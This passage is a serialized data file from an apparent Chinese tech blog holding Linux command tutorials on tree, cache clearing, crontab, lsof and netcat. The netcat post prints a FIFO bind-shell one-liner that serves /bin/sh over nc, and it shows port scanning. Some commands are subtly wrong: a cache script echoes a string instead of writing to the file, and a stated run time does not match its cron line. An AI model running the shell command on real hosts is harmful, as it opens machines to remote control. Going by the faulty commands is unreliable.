\n 添加bin或者sbin目录即可 \n \n'},{title:"Linux 生成目录树",frontmatter:{title:"Linux 生成目录树",date:"2021-10-23T13:56:55.000Z",tags:["linux","tree"],categories:"linux",published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/linux/linux_build_directory_tree.html",relativePath:"blogs/linux/linux_build_directory_tree.md",key:"v-2e589377",path:"/blogs/linux/linux_build_directory_tree.html",lastUpdated:"3/6/2022, 3:57:06 PM",content:' Linux tree命令用于以树状图列出目录的内容。 \n 执行tree指令，它会列出指定目录下的所有文件，包括子目录里的文件。 \n 语法 \n tree  [ -aACdDfFgilnNpqstux ] [ -I  < 范本样式 > ] [ -P  < 范本样式 > ] [ 目录 .. . ] \n \n 1 参数说明： \n \n -a 显示所有文件和目录。 \n -A 使用ASNI绘图字符显示树状图而非以ASCII字符组合。 \n -C 在文件和目录清单加上色彩，便于区分各种类型。 \n -d 显示目录名称而非内容。 \n -D 列出文件或目录的更改时间。 \n -f 在每个文件或目录之前，显示完整的相对路径名称。 \n -F 在执行文件，目录，Socket，符号连接，管道名称名称，各自加上"*","/","=","@","|"号。 \n -g 列出文件或目录的所属群组名称，没有对应的名称时，则显示群组识别码。 \n -i 不以阶梯状列出文件或目录名称。 \n -L level 限制目录显示层级。 \n -l 如遇到性质为符号连接的目录，直接列出该连接所指向的原始目录。 \n -n 不在文件和目录清单加上色彩。 \n -N 直接列出文件和目录名称，包括控制字符。 \n -p 列出权限标示。 \n -P<范本样式> 只显示符合范本样式的文件或目录名称。 \n -q 用"?"号取代控制字符，列出文件和目录名称。 \n -s 列出文件或目录大小。 \n -t 用文件和目录的更改时间排序。 \n -u 列出文件或目录的拥有者名称，没有对应的名称时，则显示用户识别码。 \n -x 将范围局限在现行的文件系统中，若指定目录下的某些子目录，其存放于另一个文件系统上，则将该子目录予以排除在寻找范围外。 \n \n'},{title:"查看linux系统版本",frontmatter:{title:"查看linux系统版本",date:"2021-07-17T11:18:27.000Z",tags:["linux"],categories:"linux",published:!0,hideInList:!1,feature:"/post-images/P3bskku2B.jpg",isTop:!1},regularPath:"/blogs/linux/linux_check_the_linux_system_version.html",relativePath:"blogs/linux/linux_check_the_linux_system_version.md",key:"v-9c14bbee",path:"/blogs/linux/linux_check_the_linux_system_version.html",headers:[{level:2,title:"一、查看Linux内核版本命令（两种方法）：",slug:"一、查看linux内核版本命令-两种方法"},{level:2,title:"二、查看Linux系统版本的命令（3种方法）",slug:"二、查看linux系统版本的命令-3种方法"},{level:3,title:"适用于所有的Linux发行版，包括RedHat、SUSE、Debian…等发行版",slug:"适用于所有的linux发行版-包括redhat、suse、debian-等发行版"},{level:3,title:"只适合Redhat系的Linux",slug:"只适合redhat系的linux"},{level:3,title:"适用于所有的Linux发行版",slug:"适用于所有的linux发行版"}],lastUpdated:"3/6/2022, 3:57:06 PM",content:" 一、查看Linux内核版本命令（两种方法）： \n cat  /proc/version\n \n 1 uname  -a\n \n 1 #  二、查看Linux系统版本的命令（3种方法） \n 适用于所有的Linux发行版，包括RedHat、SUSE、Debian…等发行版 \n lsb_release -a\n \n 1 #  只适合Redhat系的Linux \n lsb_release -a\n \n 1 #  适用于所有的Linux发行版 \n lsb_release -a\n \n 1 "},{title:"在 Linux 上如何清除内存的 Cache、Buffer 和交换空间",frontmatter:{title:"在 Linux 上如何清除内存的 Cache、Buffer 和交换空间",date:"2021-10-09T23:16:59.000Z",tags:["linux"],categories:"linux",published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/linux/linux_clean_cache_buffer.html",relativePath:"blogs/linux/linux_clean_cache_buffer.md",key:"v-5a9a97d3",path:"/blogs/linux/linux_clean_cache_buffer.html",lastUpdated:"3/6/2022, 3:57:06 PM",content:" 像任何其他的操作系统一样，GNU/Linux 已经实现的内存管理不仅有效，而且更好。但是，如果有任何进程正在蚕食你的内存，而你想要清除它的话，Linux 提供了一个刷新或清除RAM缓存方法。 \n 如何在 Linux 中清除缓存（Cache） \n 每个 Linux 系统有三种选项来清除缓存而不需要中断任何进程或服务。 \n （LCTT 译注：Cache，译作“缓存”，指 CPU 和内存之间高速缓存。Buffer，译作“缓冲区”，指在写入磁盘前的存储再内存中的内容。在本文中，Buffer 和 Cache 有时候会通指。） \n \n 仅清除页面缓存（PageCache） \n \n sync ;   echo   1   >  /proc/sys/vm/drop_caches       \n \n 1 \n 清除目录项和inode \n \n sync ;   echo   2   >  /proc/sys/vm/drop_caches       \n \n 1 \n 清除页面缓存，目录项和inode \n \n sync ;   echo   3   >  /proc/sys/vm/drop_caches \n \n 1 上述命令的说明： \n sync 将刷新文件系统缓冲区（buffer），命令通过“;”分隔，顺序执行，shell在执行序列中的下一个命令之前会等待命令的终止。正如内核文档中提到的，写入到drop_cache将清空缓存而不会杀死任何应用程序/服务，echo命令做写入文件的工作。 \n 如果你必须清除磁盘高速缓存，第一个命令在企业和生产环境中是最安全，\"...echo 1> ...\"只会清除页面缓存。 在生产环境中不建议使用上面的第三个选项\"...echo 3 > ...\" ，除非你明确自己在做什么，因为它会清除缓存页，目录项和inodes。 \n 在Linux上释放也许被内核所使用的缓冲区（Buffer）和缓存（Cache）是否是个好主意？ \n 当你设置许多设定想要检查效果时，如果它实际上是专门针对 I/O 范围的基准测试，那么你可能需要清除缓冲区和缓存。你可以如上所示删除缓存，无需重新启动系统（即无需停机）。 \n Linux被设计成它在寻找磁盘之前到磁盘缓存寻找的方式。如果它发现该资源在缓存中，则该请求不会发送到磁盘。如果我们清理缓存，磁盘缓存就起不到作用了，系统会到磁盘上寻找资源。 \n 此外，当清除缓存后它也将减慢系统运行速度，系统会将每一个被请求的资源再次加载到磁盘缓存中。 \n 现在，我们将创建一个 shell 脚本，通过一个 cron 调度任务在每天下午2点自动清除RAM缓存。如下创建一个 shell 脚本 clearcache.sh 并在其中添加以下行： \n #!/bin/bash \n注意，我们这里使用了 \"echo 3\"，但是不推荐使用在产品环境中，应该使用 \"echo 1\" \n echo   \"echo 3 > /proc/sys/vm/drop_caches\" \n \n 1 2 3 给clearcache.sh文件设置执行权限 \n chmod   755  clearcache.sh\n \n 1 现在，当你需要清除内存缓存时只需要调用脚本。 \n 现在设置一个每天下午2点的定时任务来清除RAM缓存，打开crontab进行编辑。 \n crontab  -e\n \n 1 #   \n 添加以下行，保存并退出。 \n 0 3 * * * /path/to/clearcache.sh\n \n 1 有关如何创建一个定时任务，更多细节你可以查看我们的文章  11 个定时调度任务的例子 。 \n 在生产环境的服务器上自动清除RAM是否是一个好主意？ \n 不！它不是。想想一个情况，当你已经预定脚本在每天下午2点来清除内存缓存。那么其时该脚本会执行并刷新你的内存缓存。在某一天由于某些原因，可能您的网站的在线用户会超过预期地从你的服务器请求资源。 \n 而在这时，按计划调度的脚本运行了，并清除了缓存中的一切。当所有的用户都从磁盘读取数据时，这将导致服务器崩溃并损坏数据库。因此，清除缓存仅在必要时并且在你的预料之中，否则你就是个呆瓜系统管理员 \n 如何清除Linux的交换空间？ \n 如果你想清除掉的空间，你可以运行下面的命令： \n swapoff -a  &&   swapon  -a\n \n 1 此外，了解有关风险后，您可以将上面的命令添加到cron中。 \n 现在，我们将上面两种命令结合成一个命令，写成正确的脚本来同时清除RAM缓存和交换空间。 \n echo   3   >  /proc/sys/vm/drop_caches  &&  swapoff -a  &&   swapon  -a  &&   printf   ' \\n %s \\n '   'Ram-cache and Swap Cleared' \n \n 1 或 \n su  -c  'echo 3 > /proc/sys/vm/drop_caches'   &&  swapoff -a  &&   swapon  -a  &&   printf   ' \\n %s \\n '   'Ram-cache and Swap Cleared' \n \n 1 在测试上面的命令之前，我们在执行脚本前后运行“free -m” 来检查缓存。 \n"},{title:"linux 命令 —— crontab 命令 定时任务",frontmatter:{title:"linux 命令 —— crontab 命令 定时任务",date:"2022-01-19T19:16:28.000Z",tags:["command","crontab"],categories:"linux",published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/linux/linux_command_crontab.html",relativePath:"blogs/linux/linux_command_crontab.md",key:"v-eea22916",path:"/blogs/linux/linux_command_crontab.html",headers:[{level:2,title:"命令简介",slug:"命令简介"},{level:2,title:"格式",slug:"格式"},{level:2,title:"实例",slug:"实例"},{level:3,title:"实例1：每1分钟执行一次myCommand",slug:"实例1-每1分钟执行一次mycommand"},{level:3,title:"实例2：每小时的第3和第15分钟执行",slug:"实例2-每小时的第3和第15分钟执行"},{level:3,title:"实例3：在上午8点到11点的第3和第15分钟执行",slug:"实例3-在上午8点到11点的第3和第15分钟执行"},{level:3,title:"实例4：每隔两天的上午8点到11点的第3和第15分钟执行",slug:"实例4-每隔两天的上午8点到11点的第3和第15分钟执行"},{level:3,title:"实例5：每周一上午8点到11点的第3和第15分钟执行",slug:"实例5-每周一上午8点到11点的第3和第15分钟执行"},{level:3,title:"实例6：每晚的21:30重启smb",slug:"实例6-每晚的21-30重启smb"},{level:3,title:"实例7：每月1、10、22日的4 : 45重启smb",slug:"实例7-每月1、10、22日的4-45重启smb"},{level:3,title:"实例8：每周六、周日的1 : 10重启smb",slug:"实例8-每周六、周日的1-10重启smb"},{level:3,title:"实例9：每天18 : 00至23 : 00之间每隔30分钟重启smb",slug:"实例9-每天18-00至23-00之间每隔30分钟重启smb"},{level:3,title:"实例10：每星期六的晚上11 : 00 pm重启smb",slug:"实例10-每星期六的晚上11-00-pm重启smb"},{level:3,title:"实例11：每一小时重启smb",slug:"实例11-每一小时重启smb"},{level:3,title:"实例12：晚上11点到早上7点之间，每隔一小时重启smb",slug:"实例12-晚上11点到早上7点之间-每隔一小时重启smb"},{level:2,title:"几种便捷写法",slug:"几种便捷写法"}],lastUpdated:"3/6/2022, 3:57:06 PM",content:" 命令简介 \n 我们经常使用的是crontab命令是cron table的简写，它是cron的配置文件，也可以叫它作业列表，我们可以在以下文件夹内找到相关配置文件。 \n \n /var/spool/cron/ 目录下存放的是每个用户包括root的crontab任务，每个任务以创建者的名字命名 \n /etc/crontab 这个文件负责调度各种管理和维护任务。 \n /etc/cron.d/ 这个目录用来存放任何要执行的crontab文件或脚本。\n我们还可以把脚本放在/etc/cron.hourly、/etc/cron.daily、/etc/cron.weekly、/etc/cron.monthly目录中，让它每小时/天/星期、月执行一次。 \n \n nc 实际上是 ncat 的软链接。ncat 是为 Nmap(Network Mapper) 项目编写的，是 Nmap 套件中的一员，它旨在成为可靠的后端工具，可立即为其他应用程序和用户提供网络连接。ncat 不仅可以使用 IPv4 和 IPv6，还可以为用户提供几乎无限的潜在用途。 \n crontab的使用\n我们常用的命令如下： \n crontab [-u username]　　　　//省略用户表表示操作当前用户的crontab\n    -e      (编辑工作表)\n    -l      (列出工作表里的命令)\n    -r      (删除工作作业)\n \n 我们用crontab -e进入当前用户的工作表编辑，是常见的vim界面。每行是一条命令。 \n crontab的命令构成为 时间+动作，其时间有分、时、日、月、周五种，操作符有 \n \n \n \n 取值范围内的所有数字 \n \n \n / 每过多少个数字 \n \n \n 从X到Z \n \n \n ，散列数字 \n 格式 \n f1 f2 f3 f4 f5 program\n \n 1 \n 其中 f1 是表示分钟，f2 表示小时，f3 表示一个月份中的第几日，f4 表示月份，f5 表示一个星期中的第几天。program 表示要执行的程序。 \n 当 f1 为 * 时表示每分钟都要执行 program，f2 为 * 时表示每小时都要执行程序，以此类推 \n 当 f1 为 a-b 时表示从第 a 分钟到第 b 分钟这段时间内要执行，f2 为 a-b 时表示从第 a 到第 b 小时都要执行，以此类推 \n 当 f1 为 */n 时表示每 n 分钟个时间间隔执行一次，f2 为 */n 表示每 n 小时个时间间隔执行一次，以此类推 \n 当 f1 为 a, b, c,… 时表示第 a, b, c,… 分钟要执行，f2 为 a, b, c,… 时表示第 a, b, c…个小时要执行，以此类推 \n \n *    *    *    *    *\n-    -    -    -    -\n|    |    |    |    |\n|    |    |    |    +----- 星期中星期几 (0 - 7) (星期天 为0)\n|    |    |    +---------- 月份 (1 - 12)\n|    |    +--------------- 一个月中的第几天 (1 - 31)\n|    +-------------------- 小时 (0 - 23)\n+------------------------- 分钟 (0 - 59)\n \n 1 2 3 4 5 6 7 8 #  实例 \n 实例1：每1分钟执行一次myCommand \n * * * * * myCommand\n \n 1 #  实例2：每小时的第3和第15分钟执行 \n 3,15  * * * * myCommand\n \n 1 #  实例3：在上午8点到11点的第3和第15分钟执行 \n 3,15   8 -11 * * * myCommand\n \n 1 #  实例4：每隔两天的上午8点到11点的第3和第15分钟执行 \n 3,15   8 -11 */2  *  * myCommand\n \n 1 #  实例5：每周一上午8点到11点的第3和第15分钟执行 \n 3,15   8 -11 * *  1  myCommand\n \n 1 #  实例6：每晚的21:30重启smb \n 30   21  * * * /etc/init.d/smb restart\n \n 1 #  实例7：每月1、10、22日的4 : 45重启smb \n 45   4   1,10 ,22 * * /etc/init.d/smb restart\n \n 1 #  实例8：每周六、周日的1 : 10重启smb \n 10   1  * *  6,0  /etc/init.d/smb restart\n \n 1 #  实例9：每天18 : 00至23 : 00之间每隔30分钟重启smb \n 0,30   18 -23 * * * /etc/init.d/smb restart\n \n 1 #  实例10：每星期六的晚上11 : 00 pm重启smb \n 0   23  * *  6  /etc/init.d/smb restart\n \n 1 #  实例11：每一小时重启smb \n 0  */1 * * * /etc/init.d/smb restart\n \n 1 #  实例12：晚上11点到早上7点之间，每隔一小时重启smb \n 0   23 -7/1 * * * /etc/init.d/smb restart\n \n 1 #  几种便捷写法 \n @hourly 代表  0  * * * * ，每个小时运行一次\n@daily 代表  0   0  * * * ，每天凌晨运行一次\n@weekly 代表  0   0  * *  0  ，每周星期天凌晨运行一次\n@monthly 代表  0   0   1  * * ，每个月第一天凌晨运行一次\n@yearly 代表  0   0   1   1  * ，每年的头一分钟运行一次\n@reboot 重启后执行一次\n@reboot root /sbin/service httpd start   # 开机启动apache \n \n 1 2 3 4 5 6 7 /etc/cron.d/下面的文件和/etc/crontab文件格式一样。\n/etc/cron.d/0hourly文件控制定时执行/etc/cron.hourly/下面的程序 \n cat  /etc/cron.d/0hourly\nRun the hourly jobs \n SHELL = /bin/bash\n PATH = /sbin:/bin:/usr/sbin:/usr/bin\n MAILTO = root\n01 * * * * root run-parts /etc/cron.hourly\n \n 1 2 3 4 5 6 /etc/anacrontab文件控制定时执行/etc/cron.daily/, /etc/cron.monthly/,/etc/cron.weekly/下面的命令 \n cat  /etc/anacrontab\n/etc/anacrontab: configuration file for anacron \nSee anacron(8) and anacrontab(5) for details. \n\n SHELL = /bin/sh\n PATH = /sbin:/bin:/usr/sbin:/usr/bin\n MAILTO = root\nthe maximal random delay added to the base delay of the jobs \n RANDOM_DELAY = 45 \nthe jobs will be started during the following hours only \n START_HOURS_RANGE = 3 -22\n\n #period in days   delay in minutes   job-identifier   command \n 1   5  cron.daily     nice  run-parts /etc/cron.daily\n 7   25   cron.weekly    nice  run-parts /etc/cron.weekly\n@monthly  45  cron.monthly     nice  run-parts /etc/cron.monthly\n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 "},{title:"linux Curl: command not found 的解决方法",frontmatter:{title:"linux Curl: command not found 的解决方法",date:"2021-07-17T19:26:36.000Z",tags:["linux","command"],categories:"linux",published:!0,hideInList:!1,feature:"/post-images/j_rJbFeKS.png",isTop:!1},regularPath:"/blogs/linux/linux_command_curl_not_found.html",relativePath:"blogs/linux/linux_command_curl_not_found.md",key:"v-e2048eea",path:"/blogs/linux/linux_command_curl_not_found.html",lastUpdated:"3/6/2022, 3:57:06 PM",content:" 执行下面命令 \n sudo   apt  update\n sudo   apt   install   curl \n \n 1 2 "},{title:"linux ll 命令不好用了,ls 命令没有颜色了怎么办",frontmatter:{title:"linux ll 命令不好用了,ls 命令没有颜色了怎么办",date:"2021-12-19T17:39:40.000Z",tags:["ll","ls","command"],categories:"linux",published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/linux/linux_command_ll_not_find.html",relativePath:"blogs/linux/linux_command_ll_not_find.md",key:"v-d082df56",path:"/blogs/linux/linux_command_ll_not_find.html",lastUpdated:"3/6/2022, 3:57:06 PM",content:" 可以通过以下命令来实现 ll 的功能: \n 编辑  ~/.bashrc 文件添加下面命令 \nvim ~/.bashrc \n alias   ll = 'ls -al\n \n 1 2 其实这个命令是给 ls -l 命令起了个别名 ll ，然后写入 ~/.bashrc 文件中 \n 可以通过在～/.bashrc文件中添加alias命令来修改颜色，例如原来的ls和ll命令都没有颜色，这时在～/.bashrc文件中添加 \n alias   ls = 'ls --color' \n alias   ll = 'ls -al --color' \n \n 1 2 生效： \n source  ~/.bashrc\n \n 1 "},{title:"linux 命令 —— lsof 命令",frontmatter:{title:"linux 命令 —— lsof 命令",date:"2021-12-22 13:30:14",tags:["command","lsof"],categories:"linux",published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/linux/linux_command_lsof.html",relativePath:"blogs/linux/linux_command_lsof.md",key:"v-c369f3d6",path:"/blogs/linux/linux_command_lsof.html",headers:[{level:2,title:"命令简介",slug:"命令简介"},{level:2,title:"用法和参数",slug:"用法和参数"},{level:3,title:"用法：",slug:"用法"},{level:3,title:"参数说明：",slug:"参数说明"},{level:2,title:"常用命令",slug:"常用命令"}],lastUpdated:"3/6/2022, 3:57:06 PM",content:" 命令简介 \n lsof（list open files）是一个列出当前系统打开文件的工具。\n在linux环境下，任何事物都以文件的形式存在，通过文件不仅仅可以访问常规数据，还可以访问网络连接和硬件。\n所以如传输控制协议 (TCP) 和用户数据报协议 (UDP) 套接字等，系统在后台都为该应用程序分配了一个文件描述符，无论这个文件的本质如何，该文件描述符为应用程序与基础操作系统之间的交互提供了通用接口。\n因为应用程序打开文件的描述符列表提供了大量关于这个应用程序本身的信息，因此通过lsof工具能够查看这个列表对系统监测以及排错将是很有帮助的。\nlsof 命令可显示系统打开的文件，因为 lsof 需要访问核心内存和各种文件，所以必须以 root 用户的身份运行它才能够充分地发挥其功能。 \n 用法和参数 \n 用法： \n lsof   [ -?abhlnNoOPRtUvVX ]   [ + | -c c ]   [ + | -d s ]   [ +D D ]   [ + | -f [ gG ] ]   [ + | -e s ] \n [ -F  [ f ] ]   [ -g  [ s ] ]   [ -i  [ i ] ]   [ + | -L  [ l ] ]   [ +m  [ m ] ]   [ + | -M ]   [ -o  [ o ] ]   [ -p s ] \n [ + | -r  [ t ] ]   [ -s  [ p:s ] ]   [ -S  [ t ] ]   [ -T  [ t ] ]   [ -u s ]   [ + | -w ]   [ -x  [ fl ] ]   [ -Z  [ Z ] ]   [ -- ]   [ names ] \n \n 1 2 3 #  参数说明： \n -? -h #显示出lsof的帮助信息\n-a #参数被视为AND，会影响全部的参数\n-c c #显示出以字符或字符串c开头的命令程序开启的文件，如$lsof -c init\n+d s #在文件夹s下搜寻，此参数不会继续深入搜寻此文件夹。如显示在/usr/local下被程序开启的文件：$lsof +d /usr/local +D D 同上，但是会以该文件为基础往下全部搜寻，这样花费较大的CPU时　间，请谨慎使用\n-d s　#此参数以file descriptor(FD)值显示结果，可以采用范围（1-3）或个别，如显示FD为4的进程：$lsof -d 4\n-g [s] #以程序的PGID显示，也可以采用范围或个别表示，若没有特别指定，则显示全部，如显示PGID为6的进程：$lsof -g 6\n-i #用以监听有关的任何符合的地址，若没有相关地址被指定，则监听全部\n        用法： lsof -i [46][protocol][@hostname|hostaddr][:serivce|port]\n        说明：　4 6　　IPv4 或 IPv6\nprotocol TCP or UDP\nhostname internet host name\nhostaddr IPv4地址\nservice /etc/service中的service name\nport 端口号\n-l #此参数禁止将user ID 转换为登录的名称，默认是登录名称\n+|-L [l] # +或-表示开启或关闭显示文件连接数，如果只有单纯的+L，后面没有任何数字，则表示显示全部，如果后面有数字，只有文件连接数少于该数字的会被列出\n-n #不将IP地址转换为hostname,预设是转换的\n-N #显示NFS的文件\n-p s #以PID作为显示的依据\n-P #此参数禁止将port number转换为service name,预设为转换\n+|-r [t] #控制lsof不断重复执行，t为15秒，也就是说每隔15秒再重复执行 +r 一直执行，直到没有文件被显示 -r 永远不断的执行，直到收到中断讯号(ctrl+ c)\n-R #此参数增列出PID的子程序，也就是PPID\n-s #列出文件的大小，若该文件没有大小，则留下空白\n-u s #列出login name或UID为的程序\n-v #显示lsof的版本信息\n 常用命令 \n \n 列出所有正在使用文件 \n \n lsof \n \n 1 \n 找出谁在使用某个文件 \n \n lsof  /usr/sbin/httpd\n \n 1 \n 递归查找某个目录中所有打开的文件 \n \n lsof  +D /usr/local\n \n 1 \n 列出某个用户打开的所有文件 \n \n lsof  -u ubuntu  | more       #单个用户 \n \n 1 \n 查找某个程序打开的所有文件 \n \n lsof  -c httpd\n \n 1 \n 列出除root用户外的所有用户打开的文件 \n \n lsof  -u ^root\n \n 1 \n 列出所有由某个PID对应的进程打开的文件 \n \n lsof  -p  3738 \n \n 1 \n 列出所有TCP网络连接 \n \n lsof  -i tcp\n \n 1 \n 列举出IP V4 \n \n lsof  -i  4 \n \n 1 更多 lsof 的命令如下： \n lsof  -i:8080：查看8080端口占用\n lsof  -t  :  显示PID，可以与kill 配合使用，批量杀死进程\n lsof  abc.txt：显示开启文件abc.txt的进程\n lsof  -c abc：显示abc进程现在打开的文件\n lsof  -c -p  1234 ：列出进程号为1234的进程所打开的文件\n lsof  -g gid：显示归属gid的进程情况\n lsof  +d /usr/local/：显示目录下被进程开启的文件\n lsof  +D /usr/local/：同上，但是会搜索目录下的目录，时间较长\n lsof  -d  4 ：显示使用fd为4的进程\n lsof  -i -U：显示所有打开的端口和UNIX domain文件\n \n 1 2 3 4 5 6 7 8 9 10 "},{title:"linux 命令 —— nc 命令",frontmatter:{title:"linux 命令 —— nc 命令",date:"2021-12-22 12:07:03",tags:["command","nc"],categories:"linux",published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/linux/linux_command_nc.html",relativePath:"blogs/linux/linux_command_nc.md",key:"v-c332e8b2",path:"/blogs/linux/linux_command_nc.html",headers:[{level:2,title:"命令简介",slug:"命令简介"},{level:2,title:"命令格式",slug:"命令格式"},{level:2,title:"参数说明",slug:"参数说明"},{level:2,title:"常用示例",slug:"常用示例"},{level:3,title:"相互发消息(C/S模型)",slug:"相互发消息-c-s模型"},{level:3,title:"文件传输",slug:"文件传输"},{level:3,title:"端口扫描",slug:"端口扫描"},{level:3,title:"目录传输",slug:"目录传输"},{level:3,title:"测试网速",slug:"测试网速"},{level:3,title:"加密你通过网络发送的数据",slug:"加密你通过网络发送的数据"},{level:3,title:"打开一个shell",slug:"打开一个shell"},{level:3,title:"反向shell",slug:"反向shell"},{level:3,title:"指定源端口",slug:"指定源端口"},{level:3,title:"指定源地址",slug:"指定源地址"},{level:3,title:"静态web页面服务器",slug:"静态web页面服务器"},{level:3,title:"Netcat支持IPv6",slug:"netcat支持ipv6"},{level:3,title:"禁止从标准输入中读取数据",slug:"禁止从标准输入中读取数据"},{level:3,title:"强制 Netcat 服务器端保持启动状态",slug:"强制-netcat-服务器端保持启动状态"}],lastUpdated:"3/6/2022, 3:57:06 PM",content:" 命令简介 \n nc（netcat）是一个短小精悍、功能实用、简单可靠的网络工具，主要有如下作用：\n（1）端口侦听，nc 可以作为 server 以 TCP 或 UDP 方式侦听指定端口；\n（2）端口扫描，nc 可以作为 client 发起 TCP 或 UDP 请求；\n（3）机器之间传输文件；\n（4）机器之间网络测速。 \n nc 实际上是 ncat 的软链接。ncat 是为 Nmap(Network Mapper) 项目编写的，是 Nmap 套件中的一员，它旨在成为可靠的后端工具，可立即为其他应用程序和用户提供网络连接。ncat 不仅可以使用 IPv4 和 IPv6，还可以为用户提供几乎无限的潜在用途。 \n 命令格式 \n nc   [ -46DdhklnrStUuvzC ]   [ -i interval ]   [ -p source_port ]   [ -s source_ip_address ]   [ -T ToS ]   [ -w timeout ]   [ -X proxy_protocol ]   [ -x proxy_address [ :port ] ]   [ hostname ]   [ port [ s ] ] \n \n 1 #  参数说明 \n -4/6\n  强制只使用 IPv4/IPv6 地址\n-D\n  在套接字上启用调试\n-d\n  不从 stdin 读取\n-h\n  打印出帮助信息\n-k\n  强制 nc 在当前连接完成后继续侦听另一个连接。注意如果不使用 -l 选项，则使用此选项是错误的\n-l\n  指定 nc 应该侦听传入的连接，而不是启动到远程主机的连接。将此选项与 -p、-s 或 -z 选项结合使用是错误的。此外，使用 -w 选项指定的超时将被忽略\n-n\n  不要在任何指定的地址、主机名或端口上执行任何 DNS 或服务查找\n-r\n  随机选择源端口和目标端口，而不是按照系统分配的顺序或范围内的顺序选择它们\n-S\n  启用 RFC 2385 TCP MD5 签名选项\n-t\n  使 nc 发送 RFC 854 DON'T 和 WON'T 响应 RFC 854 的 DO 和 WILL 请求。这使得使用 nc 编写 telnet 会话脚本成为可能\n-U\n  指定使用 Unix 域套接字\n-u\n  使用 UDP 代替默认选项 TCP\n-v\n  显示命令执行过程\n-z\n  表示 zero，只扫描侦听守护进程，而不向它们发送任何数据。此选项与 -l 选项结合使用是错误的\n-C\n  发送 CRLF 作为换行符\n-i interval\n  指定发送和接收的文本之间的延迟时间间隔。还可指定连接到多个端口之间的延迟时间\n-p source_port\n  指定 nc 应使用的源端口，但须受特权限制和可用性限制。将此选项与 -l 选项结合使用是错误的\n-s source_ip_address\n  设置本地主机送出数据包的 IP 地址。注意将此选项与 -l 选项结合使用是错误的\n-T ToS\n  指定连接的 IP 服务类型(TOS)。有效值是标记 ''lowdelay'', ''throughput'', ''reliability''，或以 0x 开头的 8 位十六进制值\n-w timeout\n  如果连接和 stdin 空闲超过指定秒数，则连接将被关闭。-w 标志对 -l 选项没有影响。缺省不超时\n-X proxy_protocol\n  请求 nc 在与代理服务器对话时使用指定的协议。支持的协议是 “4”(SOCKsv.4)、“5”(SOCKV.5) 和 “connect”(HTTPS proxy)。如果未指定协议，则使用 SOCKS v.5\n-x proxy_address[:port]\n  使用指定代理服务器地址和端口连接到主机。如果未指定端口，则使用代理协议的已知端口（SOCKS为1080，HTTPS为3128）\n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 nc 的控制参数不少，常用的几个参数如下所列 \n -l\n  指定 nc 将处于侦听模式。指定该参数，则意味着 nc 被当作 server，侦听并接受连接，而非向其它地址发起连接\n-p PORT\n  指定 nc 使用的源端口\n-s\n  指定发送数据的源 IP 地址，适用于多网卡机器\n-u\n  指定 nc 使用 UDP 协议，默认为 TCP\n-v\n  输出交互或出错信息，新手调试时尤为有用\n-w\n  超时秒数，后面跟数字\n-z\n  表示 zero，扫描时不发送任何数据\n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 #  常用示例 \n 相互发消息(C/S模型) \n 用nc能够非常简单地建立一个基本的C/S模型。\n打开控制台，在某个端口上启动nc监听，等待连接。例如，nc在端口1234上启动监听，等待连接： \n可以认为是服务器端 \n nc  -l  10001 \n \n 1 2 在另外一个控制台上（或另外一台机器上），连接该机器上监听的端口 \n可以认为是客户端 \n nc   110.40 .137.191  10001 \n \n 1 2 现在，端口之间的连接就建立了。连接建立之后，nc并不区分谁是server，谁是client。\nLinux中的nc没有-c或-e选项（可能是安全因素），但是，你仍然能够通过重定向文件描述符在建立连接之后执行命令。注意，打开一个端口，让任何人连接并在你的机器上执行任意命令是危险的。如果你需要这样做，下面有个例子： \n 在server端: \n rm  -f /tmp/f ;   mkfifo  /tmp/f\n cat  /tmp/f  |  /bin/sh -i  2 > &1   |   nc  -l  10001   >  /tmp/f\n \n 1 2 在client端: \n nc   110.40 .137.191  10001 \n ( shell prompt from host.example.com ) \n \n 1 2 通过创建一个FIFO文件/tmp/f，让nc在server端127.0.0.1的端口1234上监听，当一个client成功连接之后，/bin/sh在服务端执行，但执行反馈传送给client端。\n当连接中断后，nc也退出。如果要保持连接，使用-k选项，但是如果命令退出，这个选项也不会重启它或保持nc运行。如果不再需要，不要忘记删除该文件描述符。 \n rm  -f /tmp/f\n \n 1 如果发送失败，可以杀掉相关进程然后重新连接。使用 kill -9 $(lsof -i:10001 -t) \n 文件传输 \n 上面的例子可以扩展来建立一个基本的数据传输模型。在连接的一端输入的任何信息将输出到另一端，输入和输出能够很容易被捕捉来模拟文件传输。\nnc在一个端口上启动监听，并将输出重定向到一个文件中，当文件传输完毕后，连接自动关闭。 \n \n 从 Server 到 Client\nServer \n \n nc  -l  10001   >  filename.out\n \n 1 在另一台机器上，连接nc运行的机器和监听端口，将要传输的文件作为输入： \n Client \n nc   110.40 .137.191  10001   <  filename.in\n \n 1 \n 从 Client 到 Server \n \n Server \n nc  -l  10001   <  filename.in\n \n 1 Client \n nc   110.40 .137.191  10001   >  filename.out\n \n 1 #  端口扫描 \n 端口扫描经常被系统管理员和黑客用来发现在一些机器上开放的端口，帮助他们识别系统中的漏洞。 \n nc  -z -v -n  110.40 .137.191  21 -25  5432 \n \n 1 可以运行在TCP或者UDP模式，默认是TCP，-u参数调整为udp.\nz 参数告诉netcat使用0 IO,连接成功后立即关闭连接， 不进行数据交换.\nv 参数指详细输出.\nn 参数告诉netcat 不要使用DNS反向查询IP地址的域名.\n以上命令会打印21到25和5432 所有开放的端口 \n 只希望将开放端口的行打印出来，可以用 grep \n nc  -z -v -n  110.40 .137.191  21 -25  2 > &1   | grep  succeeded\n \n 1 #  目录传输 \n 发送一个文件很简单，但是如果我们想要发送多个文件，或者整个目录，一样很简单，只需要使用压缩工具tar，压缩后发送压缩包。 \n \n 从 Server 到 Client \n Server \n \n tar  -czvf – testdir  |   nc  -l  10001 \n \n 1 在另一台机器上，连接nc运行的机器和监听端口，将要传输的文件作为输入： \n \n Client \n \n nc   110.40 .137.191  10001   |   tar  -xvf -\n \n 1 